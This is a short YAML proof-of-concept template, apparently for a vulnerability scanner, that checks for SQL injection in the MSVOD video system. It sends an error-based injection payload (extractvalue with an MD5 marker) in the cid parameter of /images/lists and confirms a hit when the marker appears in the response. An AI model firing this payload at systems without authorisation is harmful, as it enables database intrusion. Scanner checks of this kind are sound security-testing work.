detail:
  author: jinqi
  links:
  - https://github.com/jinqi520
expression: r0()
manual: true
name: poc-yaml-msvod-sqli
rules:
  r0:
    expression: response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
    request:
      cache: true
      method: GET
      path: /images/lists?cid=1 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,md5({{r1}})))
        desc --+a
set:
  r1: randomInt(800000000, 1000000000)
transport: http
